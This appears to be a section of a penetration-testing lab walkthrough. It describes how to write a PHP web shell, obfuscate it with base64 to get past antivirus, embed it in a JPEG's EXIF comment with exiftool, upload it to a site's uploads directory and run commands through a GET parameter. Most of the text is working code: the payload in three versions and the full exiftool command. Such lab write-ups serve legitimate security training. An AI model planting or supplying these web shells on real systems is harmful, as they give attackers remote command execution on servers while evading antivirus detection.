# PHP Payload Obfuscation

Now to begin with, I want to note that I had some trouble with this part with getting the payload to work. What ended up being the solution was to get a different image from the internet and go through the same process of changing the extension and adding the payload with **exiftool**. With that out of the way, we may begin

To start with we want to create our php payload. As we learned in the last section, doing things different to the standard method is a good way at bypassing AV software. A typically php one-liner that you may use to get RCE may look something like `<?php system($GET_["cmd"]);?>`. This will allow us to run command on the server command line. This is very common and is therefore very easily detected by an AV. We can however modify this one-liner so that it still performs the same task, but is written in a more unique way, a way the AV hasn't seen before (or at least we hope hasn't)

Something like this:
```php
<?php $cmd = $_GET["wreath"]; if(isset($cmd)){ echo "<pre>" . shell_exec($cmd) . "</pre>"; } die(); ?>
```

This does the exact same thing, however, it uses **wreath** as the **GET** parameter and then checks to see if it has been called. If it has, we then execute **shell_exec()** which is wrapped in some HTML tags to give us a clean output

Now that we have our php payload we want to obfuscate it so that it's even harder for the AV to detect it. We could do this manually but there are plenty of tools that will do it for us so we can use one of [them](https://www.gaijin.at/en/tools/php-obfuscator). 

This gives us:
```php
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```

This is good but as we are using this in a bash command (when we add it to our image), we need to escape the dollar signs, leading our final payload to look like the following:
```php
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```

From here we can add this payload to our image like so: **exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell2-gnome787.jpeg.php**

And now we can upload it to the site and access it in the directory **/resources/uploads**

From here we simply add **?wreath=COMMAND** to starting running commands on the system

